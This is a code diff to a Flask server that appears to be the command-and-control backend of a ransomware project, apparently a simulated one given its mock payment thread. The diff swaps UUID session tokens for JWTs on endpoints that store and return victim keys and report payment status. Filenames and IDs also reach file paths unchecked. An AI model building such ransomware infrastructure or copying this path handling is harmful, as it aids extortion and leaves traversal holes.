@@ -4,13 +4,14 @@ from flask_limiter.util import get_remote_address
 from flask_limiter.errors import RateLimitExceeded
 import os
 import logging
-import uuid
+import jwt
+from datetime import timedelta
 import json
 import sys
 from datetime import datetime, timezone
 import sqlite3
 import random
-from C2_Variables import DB_PATH, KEY_STORAGE_DIR, api_key, session_token_expiration, seconds_left, active_sessions
+from C2_Variables import DB_PATH, KEY_STORAGE_DIR, api_key, seconds_left, jwt_key
 from Threading import start_mock_payment, start_remove_expired_keys
 from Database import init_db
 
@@ -45,15 +46,18 @@ start_mock_payment()
 ####################################################################################################################
 
 @app.route('/create_session', methods=['POST'])
-def init_session():
+def create_jwt_session():
     received_api_key = request.headers.get('API-KEY')
     if received_api_key != api_key:
         return jsonify({"error": "Invalid API Key"}), 403
 
-    session_token = str(uuid.uuid4())
-    
-    expiration_time = datetime.now(timezone.utc) + session_token_expiration
-    active_sessions[session_token] = expiration_time
+    expiration = datetime.now(timezone.utc) + timedelta(seconds = seconds_left)
+    payload = {
+        "exp": expiration,
+        "iat": datetime.now(timezone.utc).timestamp(),
+        "sub": "session"
+    }
+    session_token = jwt.encode(payload, jwt_key, algorithm="HS256")
 
     return jsonify({"session_token": session_token})
 
@@ -69,12 +73,15 @@ def upload_key():
         return jsonify({"error": "No key provided"}), 400 # Debug Message
     
     session_token = request.headers.get('Session-Token')
-    expiration_time = active_sessions.get(session_token)
-    if not expiration_time:
-        return jsonify({"error": "Invalid session token"}), 401
-    if datetime.now(timezone.utc) > expiration_time:
-        del active_sessions[session_token]
+    if not session_token:
+        return jsonify({"error": "Missing session token"}), 401
+
+    try:
+        payload = jwt.decode(session_token, jwt_key, algorithms=["HS256"])
+    except jwt.ExpiredSignatureError:
         return jsonify({"error": "Session token expired"}), 401
+    except jwt.InvalidTokenError:
+        return jsonify({"error": "Invalid session token"}), 401
 
     key_filename = key_file.filename
     key_path = os.path.join(KEY_STORAGE_DIR, key_filename)
@@ -101,12 +108,15 @@ def get_key(unique_id):
         return jsonify({"error": "Invalid API Key"}), 403
     
     session_token = request.headers.get('Session-Token')
-    expiration_time = active_sessions.get(session_token)
-    if not expiration_time:
-        return jsonify({"error": "Invalid session token"}), 401
-    if datetime.now(timezone.utc) > expiration_time:
-        del active_sessions[session_token]
+    if not session_token:
+        return jsonify({"error": "Missing session token"}), 401
+
+    try:
+        payload = jwt.decode(session_token, jwt_key, algorithms=["HS256"])
+    except jwt.ExpiredSignatureError:
         return jsonify({"error": "Session token expired"}), 401
+    except jwt.InvalidTokenError:
+        return jsonify({"error": "Invalid session token"}), 401
     
     key_path = os.path.join(KEY_STORAGE_DIR, unique_id)
 
@@ -132,12 +142,15 @@ def payment_status(unique_id):
         return jsonify({"error": "Invalid API Key"}), 403
     
     session_token = request.headers.get('Session-Token')
-    expiration_time = active_sessions.get(session_token)
-    if not expiration_time:
-        return jsonify({"error": "Invalid session token"}), 401
-    if datetime.now(timezone.utc) > expiration_time:
-        del active_sessions[session_token]
+    if not session_token:
+        return jsonify({"error": "Missing session token"}), 401
+
+    try:
+        payload = jwt.decode(session_token, jwt_key, algorithms=["HS256"])
+    except jwt.ExpiredSignatureError:
         return jsonify({"error": "Session token expired"}), 401
+    except jwt.InvalidTokenError:
+        return jsonify({"error": "Invalid session token"}), 401
 
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
